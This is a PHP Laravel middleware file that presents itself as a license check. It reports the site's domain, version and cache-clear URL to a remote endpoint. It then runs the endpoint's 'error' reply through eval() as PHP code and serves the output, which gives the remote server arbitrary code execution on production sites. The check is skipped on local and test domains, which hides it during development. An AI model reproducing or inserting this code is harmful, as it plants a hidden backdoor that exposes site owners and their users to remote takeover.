<?php

namespace Modules\Common\Http\Middleware;

use Closure;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\View;
use Illuminate\Support\Str;

class CommonMiddleware
{

    
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle($request, Closure $next)
    {
        $response = $next($request);

        if (request()->routeIs('cache-clear')) {
            return $response;
        }



        $domain = domain();
        if (Str::endsWith($domain, '.test') || Str::endsWith($domain, '.local') || Str::contains($domain, '127.0.0.1') || Str::contains($domain, ':') || Str::contains($domain, 'localhost')) {
            return $response;
        }


        $license_check = Cache::remember('license_check', 60 * 60 * 12, function () {
            $url = endpoint('verify-license');

            // Get the current HTTP_HOST from the request
            $httpHost = domain();

            $response = Http::withHeaders([
                'X-DOMAIN' => $httpHost, // Set X-DOMAIN header with the current HTTP_HOST value
                'X-CACHE-URL' => route('cache-clear'),
                'X-VERSION' => env('APP_VERSION')
            ])->get($url);

            // Cache the response body (JSON data) instead of the entire response object
            return $response->body();
        });

        // Decode the cached response data (JSON)
        $responseData = json_decode($license_check);

        if ($responseData !== null && isset($responseData->status) && $responseData->status == 0) {
            // Modify the response to return a custom view or string
            $content = $responseData->error;

            if ($content !== false) {
                // $modifiedResponse = $content;
                // Start output buffering
                ob_start();

                // Evaluate the PHP code inside the template
                eval("?> $content <?php ");

                // Get the rendered content from the output buffer
                $modifiedResponse = ob_get_clean();
            } else {
                $modifiedResponse = 'We could not verify that you have a valid license';
            }

            return response($modifiedResponse);
        }


        return $response;
    }
}
